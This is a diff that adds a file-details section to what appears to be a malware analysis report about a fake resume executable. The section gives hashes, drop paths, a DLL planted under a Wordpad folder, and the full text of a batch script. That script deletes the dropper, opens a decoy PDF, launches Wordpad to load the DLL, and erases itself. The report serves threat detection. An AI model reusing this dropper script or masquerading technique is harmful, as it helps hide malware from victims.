@@ -76,6 +76,76 @@ Potential team contribution
 Professional background and goals
 Professional background overview
 
+
+---- File Detail(s) ----
+
+```
+File Name	MyProfessional_NewResume_Updated.exe
+File Size	376528 bytes
+File Type	PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 5 sections
+MD5	527b9a8bd9c1852d62d460d17f126f3e
+SHA1	7439f34017209915705b9a819b279f91d02e38b2
+SHA256	6724de0ce3170ddab6f980085ee31437d904df4a024fb57cae3e02dc0ba98073
+
+Filename	starter.bin
+File Size	64794 bytes
+File Type	data
+MD5	ef06059287de24d53c28f828bd54210d
+SHA1	2d0065b06296ae081a4326cb0e337b1e06a49b00
+SHA256	e85a649069a8e7cf8c5f6d92227a8f01cc33bc460ea57256715701c2acef1bf5
+
+Filename	main.bin
+File Size	64794 bytes
+File Type	data
+MD5	a42edafe7578a609ea4c44cf706f50a5
+SHA1	291ab07c8165064ee1a9a6b6cdd5c5229fda17f2
+SHA256	11d2c8d354425e3044031015f14285f67b0085acf3dcd5e73092a05144907472
+
+Filename	getfile.dll
+File Size	64533 bytes
+File Type	data
+MD5	8c8df15087b61b85df2785efdf2721a6
+SHA1	a8cb4d8ee96f6189980345138da3fd06112fc658
+SHA256	1378c2ce9139743f874fd714d912163490fe5cdf680d87ddbb6075361c704aa6
+
+File name	MgrProxy.dll
+Associated Filenames	
+C:\Users\Public\AccountPictures\Wordpad\MgrProxy.dll
+File Size	228352 bytes
+File Type	PE32+ executable (DLL) (GUI) x86-64, for MS Windows, 6 sections
+MD5	1f6ced17aa46f3b7c7fec8deaab67065
+SHA1	0743f218235459ea4edca4b27892e877806b8aae
+SHA256	0423fc338de9a547ab98d64d24769c854bd26db622e19521bd8432daaccb7b95
+
+File name	MyProfessional_NewResume_Updated.pdf
+Associated Filenames	
+C:\Users\User\AppData\Local\Temp\MyProfessional_NewResume_Updated.pdf
+File Size	8 bytes
+File Type	ISO-8859 text, with no line terminators
+MD5	7a73aa14fa1dad37615dc752b41fb918
+SHA1	9d1b800629478252b9b8c650ec0f7371da8a5ded
+SHA256	3b1c66ba7752f54698058e70667a69c81b0eff5c417cd3dad0ba2b3ddae73e8d
+
+File name	2.bat
+Associated Filenames	
+C:\Users\User\AppData\Roaming\pdf\2.bat
+File Size	507 bytes
+File Type	ASCII text, with CRLF line terminators
+MD5	79a18071c0f11b0882ef49598d45db67
+SHA1	e0733b5aeb4c37794c346532f04a4bd010e0edd0
+SHA256	fb1b48600f54820eab1132825bea75008f1790657a0ffbca9f0912cf80901a0f
+
+BAT File:
+chcp 65001>nul
+:ag
+@del /F /Q "C:\Users\User\AppData\Local\Temp\MyProfessional_NewResume_Updated.exe"
+@if exist "C:\Users\User\AppData\Local\Temp\MyProfessional_NewResume_Updated.exe" @goto ag
+@move /Y "C:\Users\User\AppData\Roaming\pdf\1" "C:\Users\User\AppData\Local\Temp\MyProfessional_NewResume_Updated.pdf"
+@start /B cmd.exe /c "C:\Users\User\AppData\Local\Temp\MyProfessional_NewResume_Updated.pdf"
+@start /B cmd.exe /c "C:\Program Files\Windows NT\Accessories\wordpad.exe"
+@del /F /Q %0
+```
+
 ---- IOCs ----
 
 Filtering Redirector:
